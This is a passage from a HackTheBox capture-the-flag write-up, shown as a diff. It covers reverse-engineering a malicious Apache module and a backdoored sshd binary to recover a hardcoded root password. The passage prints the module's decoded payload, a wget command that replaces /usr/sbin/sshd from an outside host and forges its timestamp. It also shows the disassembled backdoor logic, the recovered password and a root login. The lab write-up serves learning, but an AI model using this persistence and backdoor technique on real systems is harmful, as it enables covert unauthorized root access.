- 7997 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_access_compat.so
-...
-</code></pre><p>Latest changes are on <code>mod_reader.so</code></p>
-<p>I &lsquo;cat&rsquo; this again (ohh lord forgive me)</p>
-<pre tabindex="0"><code>eblockstrncat__stack_chk_failb64_decodeb64strchrforkpidexecvereader_modulelibc.so.6mod_reader.soGLIBC_2.2.5GLIBC_2.4�u▒i      �ii
-                                                                                         reader/bin/bash-cmod_reader.cd2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hkD`
-</code></pre><p>In all the weird stuff I got a base64 string (reference + lenght)</p>
-<pre tabindex="0"><code>d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk
-</code></pre><p>Easily decoded!</p>
-<pre tabindex="0"><code>wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
-</code></pre><p>uhm&hellip;okay there is a pro stuff going on here</p>
-<p>This module downloads a weird &ldquo;picture&rdquo; and outputs it as <code>/usr/sbin/sshd</code></p>
-<p>looks like a suspicious move! let&rsquo;s analyse the sshd file</p>
-<p>Let&rsquo;s get that file and try to Reverse engineer this (Damn I hate this part)</p>
-<pre tabindex="0"><code>└──╼ $scp steven1@10.10.11.146:/usr/sbin/sshd .
-steven1@10.10.11.146&#39;s password: 
-sshd
-</code></pre><p>Let&rsquo;s open it with Cutter</p>
-<p>There is an interresting <code>auth_password</code> function</p>
-<p>Nice backdoor they got there!</p>
-<pre tabindex="0"><code> ;-- auth_password:
-dbg.auth_password (int64_t arg1, int64_t arg2, int64_t arg7);
-; var char[31] backdoor @ rbp-0x50
-; var int64_t var_10h_2 @ rsp-0x48
-; var int64_t var_18h_2 @ rsp-0x40
-; var int64_t var_1ch @ rsp-0x3c
-; var int64_t var_1eh @ rsp-0x3a
-; var int64_t var_7h @ rsp-0x39
-; var int64_t var_10h @ rsp-0x30
-; arg int64_t arg1 @ rdi
-; arg int64_t arg2 @ rsi
-; arg int64_t arg7 @ xmm0
-0x00010650      endbr64            ; auth-passwd.c:78 ; int auth_password(ssh * ssh,char const * password);
-0x00010654      push r14
-0x00010656      mov r14, rsi       ; arg2
-0x00010659      mov esi, 0xffffa9f4 ; auth-passwd.c:86
-0x0001065e      mov edx, 0xffffffd6 ; 4294967254
-0x00010663      push r13           ; auth-passwd.c:78
-0x00010665      push r12
-0x00010667      push rbp
-0x00010668      mov rbp, rdi       ; arg1
-0x0001066b      push rbx
-0x0001066c      sub rsp, 0x30
-0x00010670      mov rbx, qword [rdi + 0x860] ; auth-passwd.c:79 ; arg1
-0x00010677      movdqa xmm0, xmmword [0x0007db30] ; auth-passwd.c:86
-0x0001067f      mov rax, qword fs:[0x28] ; auth-passwd.c:78
-0x00010688      mov qword [var_10h], rax
-0x0001068d      xor eax, eax
-0x0001068f      mov word [var_1ch], si ; auth-passwd.c:79
-0x00010694      mov rsi, rsp
-0x00010697      lea rcx, [var_7h]
-0x0001069c      mov r13, qword [rbx + 0x30] ; auth-passwd.c:80
-0x000106a0      mov r12d, dword [rbx + 0xc] ; auth-passwd.c:81
-0x000106a4      mov dword [var_18h_2], 0xbcf0b5e3 ; auth-passwd.c:83
-0x000106ac      movabs rax, 0xb2d6f4a0fda0b3d6
-0x000106b6      mov qword [var_10h_2], rax
-0x000106bb      mov rax, rsi
-0x000106be      mov byte [var_1eh], 0xa5
-0x000106c3      movaps xmmword [rsp], xmm0 ; auth-passwd.c:86 ; arg7
-...
-</code></pre><p>Ok the difficulty just went to insane real quick</p>
-<p>I checked the forums, discord and stuff and I can still feel my brain melting</p>
-<p>I am no expert in Reverse engineering but damn&hellip;I need to learn it ASAP</p>
-<p>Ok I did not fully get everything but from the help I got:</p>
-<p>the &lsquo;backdoor&rsquo; variable password is 31 bits (got that)</p>
-<p>I had to move to <code>Ghidra</code> to get a better <code>decompiler</code> output</p>
-<p>The password ismade out of those chunks</p>
-<pre tabindex="0"><code>  ...
-  backdoor._28_2_ = 0xa9f4;
-  ppVar1 = ctxt-&gt;pw;
-  iVar8 = ctxt-&gt;valid;
-  backdoor._24_4_ = 0xbcf0b5e3;
-  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
-  backdoor[30] = -0x5b;
-  backdoor._0_4_ = 0xf0e7abd6;
-  backdoor._4_4_ = 0xa4b3a3f3;
-  backdoor._8_4_ = 0xf0e7abd6;
-  backdoor._12_4_ = 0xa4b3a3f3;
-  ...
-</code></pre><p>But the order is not right and the start should be <code>0xa5</code></p>
-<pre tabindex="0"><code>        001106bb 48 89 f0        MOV        RAX,password
-        001106be c6 44 24        MOV        byte ptr [RSP + backdoor[30]],0xa5
-                 1e a5
-</code></pre><p>So we got these now!</p>
-<pre tabindex="0"><code>0xa5
-0xa9f4
-0xbcf0b5e3
-0xb2d6f4a0fda0b3d6
-0xfdb3d6e7
-0xf7bbfdc8
-0xa4b3a3f3
-0xf0e7abd6
-</code></pre><p>then we do conversion to <code>hex</code> then <code>xor</code> with the key <code>96</code></p>
-<pre tabindex="0"><code>  pbVar4 = (byte *)backdoor;
-  while( true ) {
-    pbVar5 = pbVar4 + 1;
-    *pbVar4 = bVar7 ^ 0x96;
-    if (pbVar5 == local_39) break;
-    bVar7 = *pbVar5;
-    pbVar4 = pbVar5;
-  }
-</code></pre><p>Well let cyberchef bake that for you</p>
-<p>Just follow <a href="https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,true)From_Hex('Auto')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&amp;input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg">this recipe</a></p>
-<p>then we have the root password (from the backdoor)</p>
-<pre tabindex="0"><code>@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3
-</code></pre><p>Nice! even the final password is not human-friendly! XD</p>
-<pre tabindex="0"><code>└──╼ $ssh root@10.10.11.146
-root@10.10.11.146&#39;s password: 
-Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23
-root@production:~# ls
-root.txt
-root@production:~# cat root.txt
-undetected_root_flag
-</code></pre><p>Damn hackthebox machines make me feel very ignorant!</p>
-<p>This box took me alot of time and efforts and the RE part got me stuck for too long</p>
-<p>Keep learning folks! Never stop learning!</p>
-
-            </div>
-        </article>
-
-        <hr />
-
-        <div class="post-info">
-            
-            
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="http://localhost:1313/categories/hackthebox/">HackTheBox</a></span>
-        
-    </p>
-
-			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
-  		</div>
-    </main>
-
-            </div>
-
-            
-                <footer class="footer">
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>&copy; 2024</span>
-            <span><a href="http://localhost:1313/">nair0lf32</a></span>
-            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
-            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
-            
-        </div>
-    </div>
-    
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
-        </div>
-    </div>
-    
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
-
-
-
-    </body>
-</html>
